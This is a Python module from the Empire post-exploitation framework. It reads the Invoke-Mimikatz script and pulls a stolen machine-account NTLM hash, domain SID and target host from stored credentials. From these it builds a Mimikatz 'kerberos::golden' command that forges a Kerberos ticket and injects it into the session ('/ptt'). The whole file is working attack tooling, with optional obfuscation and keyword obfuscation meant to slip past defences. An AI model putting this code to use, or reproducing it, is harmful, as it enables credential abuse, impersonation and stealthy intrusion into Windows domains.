from __future__ import print_function

import pathlib
from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.database.models import Credential
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
        if main_menu.obfuscate:
            obfuscated_module_source = module_source.replace("module_source", "obfuscated_module_source")
            if pathlib.Path(obfuscated_module_source).is_file():
                module_source = obfuscated_module_source

        try:
            with open(module_source, 'r') as f:
                module_code = f.read()
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        if main_menu.obfuscate and not pathlib.Path(obfuscated_module_source).is_file():
            script = data_util.obfuscate(installPath=main_menu.installPath, psScript=module_code,
                                         obfuscationCommand=main_menu.obfuscateCommand)
        else:
            script = module_code
    
        # if a credential ID is specified, try to parse
        cred_id = params["CredID"]
        if cred_id != "":
            
            if not main_menu.credentials.is_credential_valid(cred_id):
                return handle_error_message("[!] CredID is invalid!")

            cred: Credential = main_menu.credentials.get_credentials(cred_id)
            if not cred.username.endswith("$"):
                return handle_error_message("[!] please specify a machine account credential")
            if cred.domain != "":
                params["domain"] = cred.domain
                if cred.host != "":
                    params["target"] = str(cred.host) + "." + str(cred.domain)
            if cred.sid != "":
                params["sid"] = cred.sid
            if cred.password != "":
                params["rc4"] = cred.password
    
    
        # error checking
        if not helpers.validate_ntlm(params["rc4"]):
            return handle_error_message("[!] rc4/NTLM hash not specified")

        if params["target"] == "":
            return handle_error_message("[!] target not specified")

        if params["sid"] == "":
            return handle_error_message("[!] domain SID not specified")

        # build the golden ticket command        
        script_end = "Invoke-Mimikatz -Command '\"kerberos::golden"
    
        for option,values in params.items():
            if option.lower() != "agent" and option.lower() != "credid":
                if values and values != '':
                    script_end += " /" + str(option) + ":" + str(values)
    
        script_end += " /ptt\"'"

        if main_menu.obfuscate:
            script_end = data_util.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=main_menu.obfuscateCommand)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
